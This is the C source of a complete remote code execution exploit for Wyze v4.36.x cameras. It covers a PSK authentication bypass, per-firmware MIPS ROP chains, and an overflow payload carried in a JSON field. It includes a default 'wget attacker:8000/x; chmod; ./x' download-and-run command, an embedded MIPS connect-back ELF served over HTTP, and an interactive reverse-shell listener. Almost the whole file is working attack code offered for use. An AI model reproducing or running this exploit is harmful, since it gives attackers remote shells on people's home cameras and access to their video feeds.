#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <assert.h>
#include <signal.h>
#include <fcntl.h>
#include <unistd.h>

#include <openssl/ssl.h>
#include <openssl/err.h>

#include "debug.h"
#include "util.h"
#include "charlie.h"

#include "iotc_client.h"

#define CONNECTBACK_PORT 0xb0ef
#define HTTPD_PORT 8000
#define WYZE_TUTK_PORT 32761

#define ROP_MAXLEN 128

typedef struct
{
    char *version;
    uint32_t f_system;
    uint32_t roplen;
    uint32_t rop[128];
} target_t;

#define NUM_TARGETS 3

target_t g_targets[NUM_TARGETS] = {
    {
        .version = "v4.36.10.4054",
        .f_system = 0x0074A080,
        .rop = {
            0x51515151,
            0x51515151,
            0x53515151,
            0x54515151,
            0x55515151,
            0x56515151,
            /*
                jal     sleep
                li      $a0, 1
                b       next
                next:
                lw      $ra, 0x24+var_s8($sp)  # Load Word
                move    $v0, $s0
                lw      $s1, 0x24+var_s4($sp)  # Load Word
                lw      $s0, 0x24+var_s0($sp)  # Load Word
                jr      $ra              # Jump Register
                addiu   $sp, 0x30        # Add Immediate Unsigned
            */
            0x005BD5D4,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            /*
                addiu $a2, $sp, 0x18
                lw $ra, 0x34($sp)
                move $v0, $zero
                jr $ra
                addiu $sp, $sp, 0x38
            */
            0x0043CC9C,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x10000007,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            /*
                jr $a2
                move $s5, $a1
            */
            0x005690a4,
        },
        .roplen = 33,
    },
    {
        .version = "v4.36.11.4679",
        .f_system = 0x007556A0,
        .rop = {
            0x51515151,
            (0x00428AF4 - 0xe1c), // NOP (0x00000000 addr)
            0x53515151,
            0x54515151,
            0x55515151,
            0x56515151,
            /*
                jal     sleep
                li      $a0, 5           # seconds
                lw      $v0, 0x4D38($s2)
                bnez    $v0, loc_427AB8  # s2 + 0x4d38 should be zero.
                lw      $ra, 0x44($sp)
                lw      $s3, 0x40($sp)
                lw      $s2, 0x3C($sp)
                lw      $s1, 0x38($sp)
                lw      $s0, 0x34($sp)
                jr      $ra
                addiu   $sp, 0x48
            */
            0x00428B44,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            /*
                addiu $a2, $sp, 0x18
                lw $ra, 0x34($sp)
                move $v0, $zero
                jr $ra
                addiu $sp, $sp, 0x38
            */
            0x0043d388,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x10000007,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            /*
                jr $a2
                move $s5, $a1
            */
            0x00562564,
        },
        .roplen = 39,
    },
    {
        .version = "v4.36.11.5859",
        .f_system = 0x007556B0,
        .rop = {
            0x51515151,
            (0x0044A034 - 0x4d38), // NOP (0x00000000 addr)
            0x53515151,
            0x54515151,
            0x55515151,
            0x56515151,
            /*
                jal     sleep
                li      $a0, 5           # seconds
                lw      $v0, 0x4D38($s2)
                bnez    $v0, loc_427AB8  # s2 + 0x4d38 should be zero.
                lw      $ra, 0x44($sp)
                lw      $s3, 0x40($sp)
                lw      $s2, 0x3C($sp)
                lw      $s1, 0x38($sp)
                lw      $s0, 0x34($sp)
                jr      $ra
                addiu   $sp, 0x48
            */
            0x00427BE4,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            /*
                addiu $a2, $sp, 0x18
                lw $ra, 0x34($sp)
                move $v0, $zero
                jr $ra
                addiu $sp, $sp, 0x38
            */
            0x0044745C,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x10000007,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            0x00000000,
            /*
                jr $a2
                move $s5, $a1
            */
            0x005629F4,
        },
        .roplen = 39,
    },
};

typedef struct
{
    uint16_t port;
    uint32_t attacker_ip;
    void (*handler)(int, uint32_t);
} tcp_listener_args_t;

typedef struct custom_bio_data_st
{
    iotc_client_t *iotc;
    int peekmode;
} custom_bio_data_t;

custom_bio_data_t g_bio_data;
BIO_METHOD *g_BIO_sCHL = NULL;

int IOTC_sCHL_read(SSL *ssl, void *buf, int len)
{
    BIO *rbio;
    int result;

    DPRINTF("buf=%p, len=0x%x\n", buf, len);

    rbio = SSL_get_rbio(ssl);
    BIO_get_data(rbio);
    result = SSL_read(ssl, buf, len);
    if (result <= 0)
    {
        SSL_get_error(ssl, result);
        ERR_print_errors_fp(stderr);
    }
    return result;
}

int IOTC_sCHL_write(SSL *ssl, void *buf, int len)
{
    BIO *rbio;
    int result;

    DPRINTF("buf=%p, len=0x%x\n", buf, len);

    rbio = SSL_get_rbio(ssl);
    BIO_get_data(rbio);
    result = SSL_write(ssl, buf, len);
    if (result < 0)
    {
        SSL_get_error(ssl, result);
        ERR_print_errors_fp(stderr);
    }
    return result;
}

int BIO_sCHL_write(BIO *bio, const char *buf, int len)
{
    DPRINTF("buf=%p, len=0x%x\n", buf, len);
#ifdef DEBUG
    hexdump((void *)buf, len);
#endif

    custom_bio_data_t *bio_ctx = (custom_bio_data_t *)BIO_get_data(bio);

    return iotc_client_write_session_data(bio_ctx->iotc, (uint8_t *)buf, len);
}

int BIO_sCHL_read(BIO *bio, char *buf, int len)
{
    DPRINTF("buf=%p, len=0x%x\n", buf, len);

    custom_bio_data_t *bio_ctx = (custom_bio_data_t *)BIO_get_data(bio);
    int r = iotc_client_read_session_data(bio_ctx->iotc, (uint8_t *)buf, len);

#ifdef DEBUG
    DPRINTF("read done:\n");
    hexdump((void *)buf, r);
#endif
    return r;
}

long BIO_sCHL_ctrl(BIO *b, int cmd, long larg, void *pargs)
{
    DPRINTF("cmd=0x%x, larg=0x%lx, pargs=%p\n", cmd, larg, pargs);

    int ret = 0;

    switch (cmd)
    {
    case BIO_CTRL_GET_KTLS_SEND:
    case BIO_CTRL_GET_KTLS_RECV:
        ret = 0;
        break;

    case BIO_CTRL_FLUSH:
    case BIO_CTRL_DGRAM_SET_CONNECTED:
    case BIO_CTRL_DGRAM_SET_PEER:
    case BIO_CTRL_DGRAM_GET_PEER:
        ret = 1;
        break;

    case BIO_CTRL_WPENDING:
        ret = 0;
        break;

    case BIO_CTRL_DGRAM_QUERY_MTU:
    case BIO_CTRL_DGRAM_GET_FALLBACK_MTU:
        ret = 1500;
        break;

    case BIO_CTRL_DGRAM_GET_MTU_OVERHEAD:
        ret = 96;
        break;

    case BIO_CTRL_DGRAM_SET_PEEK_MODE:
        ((custom_bio_data_t *)BIO_get_data(b))->peekmode = !!larg;
        ret = 1;
        break;

    case BIO_CTRL_PUSH:
    case BIO_CTRL_POP:
    case BIO_CTRL_DGRAM_SET_NEXT_TIMEOUT:
        ret = 0;
        break;

    default:
        printf("unhandled bio ctrl!\n");
        raise(SIGTRAP);
        break;
    }

    return ret;
}

int BIO_sCHL_create(BIO *b)
{
    DPRINTF("start\n");
    return 1;
}

int BIO_sCHL_destroy(BIO *b)
{
    DPRINTF("start\n");
    return 1;
}

BIO_METHOD *BIO_sCHL(void)
{
    DPRINTF("start\n");

    if (g_BIO_sCHL)
    {
        return g_BIO_sCHL;
    }

    g_BIO_sCHL = BIO_meth_new(
        BIO_get_new_index() | BIO_TYPE_SOURCE_SINK, "BIO_sCHL");

    BIO_meth_set_write(g_BIO_sCHL, BIO_sCHL_write);
    BIO_meth_set_read(g_BIO_sCHL, BIO_sCHL_read);
    BIO_meth_set_ctrl(g_BIO_sCHL, BIO_sCHL_ctrl);
    BIO_meth_set_create(g_BIO_sCHL, BIO_sCHL_create);
    BIO_meth_set_destroy(g_BIO_sCHL, BIO_sCHL_destroy);

    return g_BIO_sCHL;
}

uint8_t g_psk_null_sha256[0x20] = {
    0xe3, 0xb0, 0xc4, 0x42, 0x98, 0xfc, 0x1c, 0x14, 0x9a, 0xfb, 0xf4, 0xc8,
    0x99, 0x6f, 0xb9, 0x24, 0x27, 0xae, 0x41, 0xe4, 0x64, 0x9b, 0x93, 0x4c,
    0xa4, 0x95, 0x99, 0x1b, 0x78, 0x52, 0xb8, 0x55};

unsigned int sCHL_psk_client_callback(
    SSL *ssl,
    const char *hint,
    char *identity,
    unsigned int max_identity_len,
    unsigned char *psk,
    unsigned int max_psk_len)
{
    DPRINTF("ssl=%p, hint='%s', max_identity_len=0x%x, max_psk_len=0x%x\n", ssl, hint, max_identity_len, max_psk_len);

    // yo we bypassin'
    strcpy(identity, "AUTHTKN_");
    memcpy(psk, g_psk_null_sha256, 0x20);

    return 0x20;
}

uint8_t *pwn_pre_build(uint32_t *pkt_size)
{
    *pkt_size = 570;

    uint8_t *pkt = calloc(*pkt_size, 1);

    uint8_t pkt_head[] = {
        0x00, 0x20, 0x0b, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x22, 0x02, 0x00, 0x00, 0x7c, 0xc9, 0x98, 0x60,
        0x61, 0x64, 0x6d, 0x69, 0x6e, 0x00, 0x00, 0x00};

    uint8_t pkt_tail[] = {
        0x01, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0xfb, 0x07, 0x1f, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x03, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00};

    memcpy(pkt, pkt_head, sizeof(pkt_head));
    memset(pkt + 0x119, 'X', 0x10);
    memcpy(pkt + *pkt_size - sizeof(pkt_tail), pkt_tail, sizeof(pkt_tail));

    return pkt;
}

uint8_t *pwn_main_build(target_t *target, char *cmd, uint32_t *pkt_size)
{
    uint32_t numbers[256];

    uint32_t minicode[] = {
        0x3c190000 | (target->f_system >> 16),    // lui $t9, F_SYSTEM_HI
        0x37390000 | (target->f_system & 0xffff), // ori $t9, F_SYSTEM_LO
        0x23a4001c,                               // add $a0, $sp, 28
        0x0320f809,                               // spinnaz: jalr $t9
        0x00000000,                               // nop
        0x1000ffff,                               // j spinnaz
        0x00000000,
    };

    int p = 0;

    for (int i = 0; i < 25; i++)
    {
        numbers[p++] = i;
    }

    for (int i = 0; i < target->roplen; i++)
    {
        numbers[p++] = target->rop[i];
    }

    for (int i = 0; i < (sizeof(minicode) / sizeof(uint32_t)); i++)
    {
        numbers[p++] = minicode[i];
    }

    uint32_t *cmd32 = (uint32_t *)cmd;

    for (int i = 0; i < (strlen(cmd) / 4); i++)
    {
        numbers[p++] = cmd32[i];
    }

    char caminfo[0x400];
    strcpy(caminfo, "{\"cameraInfo\":{\"audioEncoderList\":[");
    for (int i = 0; i < p; i++)
    {
        sprintf(caminfo + strlen(caminfo), "%u,", numbers[i]);
    }
    strcat(caminfo, "0]}}");

    uint8_t hl_body[20] = {
        0x00, 0x01, 0x00, 0x00, 0x48, 0x4c, 0x00, 0x00, // header
        0x10, 0x27,                                     // opcode
        0x00, 0x00,                                     // body size
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // padding
    };

    wle16(hl_body + 10, strlen(caminfo) & 0xffff);

    uint8_t pkt_hdr[36] = {
        0x0c, 0x00, 0x0b, 0x00, 0x00, 0x00, 0x00, 0x00, // header
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // ..
        0x00, 0x70, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, // ..
        0x00, 0x00,                                     // hl_body size (offset 0x18)
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // padding
        0x00, 0x00,                                     // ..
    };

    wle16(pkt_hdr + 0x18, (sizeof(hl_body) + strlen(caminfo)) & 0xffff);

    *pkt_size = sizeof(pkt_hdr) + sizeof(hl_body) + strlen(caminfo);

    uint8_t *pkt = calloc(*pkt_size, 1);
    memcpy(pkt, pkt_hdr, sizeof(pkt_hdr));
    memcpy(pkt + sizeof(pkt_hdr), hl_body, sizeof(hl_body));
    memcpy(pkt + sizeof(pkt_hdr) + sizeof(hl_body), caminfo, strlen(caminfo));

    return pkt;
}

// thanks eSDee
void shell(int sock, uint32_t attacker_ip)
{
    fd_set fd_read;
    char buff[1024], *cmd = "echo \"*** WE OUTTA HERE ***\";uname -a;id;/bin/sh -i\n";
    int n;

    FD_ZERO(&fd_read);
    FD_SET(sock, &fd_read);
    FD_SET(0, &fd_read);

    info("YES! spawning interactive shell\n");

    send(sock, cmd, strlen(cmd), 0);

    while (1)
    {
        FD_SET(sock, &fd_read);
        FD_SET(0, &fd_read);

        if (select(FD_SETSIZE, &fd_read, NULL, NULL, NULL) < 0)
            break;

        if (FD_ISSET(sock, &fd_read))
        {

            if ((n = recv(sock, buff, sizeof(buff), 0)) < 0)
            {
                fprintf(stderr, "EOF\n");
                exit(2);
            }

            if (write(1, buff, n) < 0)
                break;
        }

        if (FD_ISSET(0, &fd_read))
        {

            if ((n = read(0, buff, sizeof(buff))) < 0)
            {
                fprintf(stderr, "EOF\n");
                exit(2);
            }

            if (send(sock, buff, n, 0) < 0)
                break;
        }

        usleep(10);
    }

    fprintf(stderr, "Connection lost.\n\n");
    exit(0);
}

void httpd_handle_request(int sock, uint32_t attacker_ip)
{
    char request[1024];

    // tiny MIPS connectback ELF:
    // if (fork() == 0) { setsid(); connectback(ip, 0xb0ef); } else { exit(0); }
    uint8_t mips_connectback_code[] = {
        0x7f, 0x45, 0x4c, 0x46, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x02, 0x00, 0x08, 0x00, 0x01, 0x00, 0x00, 0x00,
        0x54, 0x00, 0x40, 0x00, 0x34, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x06, 0x10, 0x00, 0x00, 0x34, 0x00, 0x20, 0x00, 0x01, 0x00, 0x01, 0x00,
        0x00, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x40, 0x00, 0x00, 0x00, 0x40, 0x00, 0x2c, 0x01, 0x00, 0x00,
        0x2c, 0x01, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00,
        0xa2, 0x0f, 0x02, 0x24, 0x0c, 0x00, 0x00, 0x00, 0x06, 0x00, 0x40, 0x10,
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x04, 0x24,
        0xa1, 0x0f, 0x02, 0x24, 0x0c, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
        0xe2, 0x0f, 0x02, 0x24, 0x0c, 0x00, 0x00, 0x00, 0x02, 0x00, 0x04, 0x24,
        0x02, 0x00, 0x05, 0x24, 0x25, 0x30, 0x00, 0x00, 0x57, 0x10, 0x02, 0x24,
        0x0c, 0x00, 0x00, 0x00, 0x25, 0x20, 0x40, 0x00, 0xe0, 0xff, 0xbd, 0x23,
        0xb0, 0xef, 0x02, 0x3c, 0x02, 0x00, 0x42, 0x34, 0x00, 0x00, 0xa2, 0xaf,
        0xcc, 0xdd, 0x02, 0x3c, 0xaa, 0xbb, 0x42, 0x34, 0x04, 0x00, 0xa2, 0xaf,
        0x08, 0x00, 0xa0, 0xaf, 0x0c, 0x00, 0xa0, 0xaf, 0x25, 0x28, 0xa0, 0x03,
        0x10, 0x00, 0x06, 0x24, 0x4a, 0x10, 0x02, 0x24, 0x0c, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x05, 0x24, 0xdf, 0x0f, 0x02, 0x24, 0x0c, 0x00, 0x00, 0x00,
        0x01, 0x00, 0x05, 0x24, 0xdf, 0x0f, 0x02, 0x24, 0x0c, 0x00, 0x00, 0x00,
        0x02, 0x00, 0x05, 0x24, 0xdf, 0x0f, 0x02, 0x24, 0x0c, 0x00, 0x00, 0x00,
        0x69, 0x6e, 0x02, 0x3c, 0x2f, 0x62, 0x42, 0x34, 0x10, 0x00, 0xa2, 0xaf,
        0x68, 0x00, 0x02, 0x3c, 0x2f, 0x73, 0x42, 0x34, 0x14, 0x00, 0xa2, 0xaf,
        0x10, 0x00, 0xa4, 0x27, 0x18, 0x00, 0xa4, 0xaf, 0x1c, 0x00, 0xa0, 0xaf,
        0x18, 0x00, 0xa5, 0x27, 0x25, 0x30, 0x00, 0x00, 0xab, 0x0f, 0x02, 0x24,
        0x0c, 0x00, 0x00, 0x00, 0xff, 0xff, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00,
        0x00, 0x00, 0x00, 0x00};

#define OFFS_HI 0xAC
#define OFFS_LO 0xa8

    mips_connectback_code[OFFS_HI + 0] = (attacker_ip >> 24) & 0xff;
    mips_connectback_code[OFFS_HI + 1] = (attacker_ip >> 16) & 0xff;
    mips_connectback_code[OFFS_LO + 0] = (attacker_ip >> 8) & 0xff;
    mips_connectback_code[OFFS_LO + 1] = attacker_ip & 0xff;

    char reply[128];

    ssize_t nread = read(sock, request, sizeof(request) - 1);

    if (nread <= 0)
    {
        printf("httpd: didnt get a request from client, wtf\n");
        return;
    }

    if (strncmp(request, "GET /x", 6) == 0)
    {
        info("httpd: serving payload");

        snprintf(reply, sizeof(reply) - 1,
                 "HTTP/1.1 200 OK\r\n"
                 "Content-Length: %lu\r\n"
                 "Content-Type: application/octet-stream\r\n"
                 "\r\n",
                 sizeof(mips_connectback_code));

        write(sock, reply, strlen(reply));
        write(sock, mips_connectback_code, sizeof(mips_connectback_code));
    }
    else
    {
        printf("httpd: illegal request, wtf\n");
    }
}

void *tcp_listener_thread(void *arg)
{
    tcp_listener_args_t *args = (tcp_listener_args_t *)arg;

    int server_fd, client_fd;
    struct sockaddr_in address;
    int opt = 1;
    int addrlen = sizeof(address);

    if ((server_fd = socket(AF_INET, SOCK_STREAM, 0)) < 0)
    {
        perror("socket failed");
        exit(EXIT_FAILURE);
    }

#ifdef __APPLE__
    if (setsockopt(server_fd, SOL_SOCKET,
                   SO_REUSEPORT, &opt,
                   sizeof(opt)))
    {
        perror("setsockopt");
        exit(EXIT_FAILURE);
    }
#else
    if (setsockopt(server_fd, SOL_SOCKET,
                   SO_REUSEADDR | SO_REUSEPORT, &opt,
                   sizeof(opt)))
    {
        perror("setsockopt");
        exit(EXIT_FAILURE);
    }
#endif

    address.sin_family = AF_INET;
    address.sin_addr.s_addr = INADDR_ANY;
    address.sin_port = htons(args->port);

    if (bind(server_fd, (struct sockaddr *)&address,
             sizeof(address)) < 0)
    {
        perror("bind failed");
        exit(EXIT_FAILURE);
    }
    if (listen(server_fd, 3) < 0)
    {
        perror("listen");
        exit(EXIT_FAILURE);
    }

    if ((client_fd = accept(server_fd, (struct sockaddr *)&address,
                            (socklen_t *)&addrlen)) < 0)
    {
        perror("accept");
        exit(EXIT_FAILURE);
    }

    args->handler(client_fd, args->attacker_ip);

    close(client_fd);

    shutdown(server_fd, SHUT_RDWR);
    return 0;
}

void usage(char *prog)
{
    printf("  usage: %s <target_id> <camera_ip> <attacker_ip> [cmd]\n\n", prog);
    printf("  targets:\n");
    for (int i = 0; i < NUM_TARGETS; i++)
    {
        printf("    > %d: %s\n", i, g_targets[i].version);
    }
    printf("\n");
}

void banner()
{
    fprintf(stdout,
            "\n"
            "      $$$ WYZECAM v4.36.x.x RCE exploit $$$\n"
            "         -- by blasty <peter@haxx.in> --\n"
            "\n"
            "       ... lights, camera, action!\n"
            "\n");
}

int main(int argc, char **argv)
{

    banner();

    if (argc != 4 && argc != 5)
    {
        usage(argv[0]);
        return -1;
    }

    int target_id = atoi(argv[1]);

    if (target_id < 0 || target_id >= NUM_TARGETS)
    {
        usage(argv[0]);
        return -1;
    }

    target_t *target = &g_targets[target_id];

    char *camera_ip = argv[2];
    char *attacker_ip = argv[3];

    char cmd[128];

    if (argc == 5)
    {
        strncpy(cmd, argv[4], sizeof(cmd) - 1);
        strncat(cmd, " #### ", sizeof(cmd) - 1);
    }
    else
    {
        // pwn2own
        snprintf(
            cmd, sizeof(cmd) - 1,
            "cd /tmp;wget %s:8000/x;chmod +x x;./x ##### ", attacker_ip);
    }

    pthread_t th_connectback;
    pthread_t th_httpd;

    info("starting httpd");
    tcp_listener_args_t th_httpd_args = {
        .port = HTTPD_PORT,
        .handler = httpd_handle_request,
        .attacker_ip = ip2addr(attacker_ip),
    };

    info("starting connectback listener");
    pthread_create(&th_httpd, NULL, tcp_listener_thread, (void *)&th_httpd_args);

    tcp_listener_args_t th_connectback_args = {
        .port = CONNECTBACK_PORT,
        .handler = shell,
        .attacker_ip = ip2addr(attacker_ip),
    };

    pthread_create(&th_connectback, NULL, tcp_listener_thread, (void *)&th_connectback_args);

    sleep(1);

    info("using target       : %s", target->version);
    info("attacking WYZE cam : %s", camera_ip);
    info("sending shells to  : %s", attacker_ip);

    // init iotc client
    iotc_client_t *iotc = malloc(sizeof(iotc_client_t));
    iotc_client_init(iotc, camera_ip, WYZE_TUTK_PORT);

    // init ssl crap
    SSL_load_error_strings();
    SSL_library_init();

    SSL_CTX *ctx = SSL_CTX_new(DTLS_client_method());
    SSL_CTX_set_min_proto_version(ctx, DTLS1_2_VERSION);
    SSL_CTX_set_psk_client_callback(ctx, sCHL_psk_client_callback);
    SSL_CTX_set_cipher_list(ctx, "ECDHE-PSK-CHACHA20-POLY1305");

    SSL *ssl = SSL_new(ctx);

    BIO *custom_bio = BIO_new(BIO_sCHL());
    if (custom_bio == NULL)
    {
        ERR_print_errors_fp(stderr);
        fatal("failed to init bio.");
        return -1;
    }

    g_bio_data.iotc = iotc;

    BIO_set_data(custom_bio, (void *)&g_bio_data);
    BIO_set_init(custom_bio, 1);

    SSL_set_bio(ssl, custom_bio, custom_bio);

    info("trying to build a session..");

    // start iotc session
    iotc_client_start_session(iotc);

    info("session setup done");

    int ret = SSL_connect(ssl);

    if (ret == 1)
    {
        info("handshake ok!");
    }
    else if (SSL_get_error(ssl, ret) == SSL_ERROR_SSL)
    {
        ERR_print_errors_fp(stderr);
        fatal("fuck");
        return -1;
    }

    info("letting the camera know we are here");
    uint32_t pkt_pwn_pre_size = 0;
    uint8_t *pkt_pwn_pre = pwn_pre_build(&pkt_pwn_pre_size);
    ret = SSL_write(ssl, pkt_pwn_pre, pkt_pwn_pre_size);
    DPRINTF("write ret = %d\n", ret);

    info("shoving the shells down the pipe");
    uint32_t pkt_pwn_main_size = 0;
    uint8_t *pkt_pwn_main = pwn_main_build(target, cmd, &pkt_pwn_main_size);
    ret = SSL_write(ssl, pkt_pwn_main, pkt_pwn_main_size);
    DPRINTF("write ret = %d\n", ret);
    maybe("we put the things in the hole, standbye and pray for victory..\n");

    pthread_join(th_httpd, NULL);
    pthread_join(th_connectback, NULL);

    return 0;
}
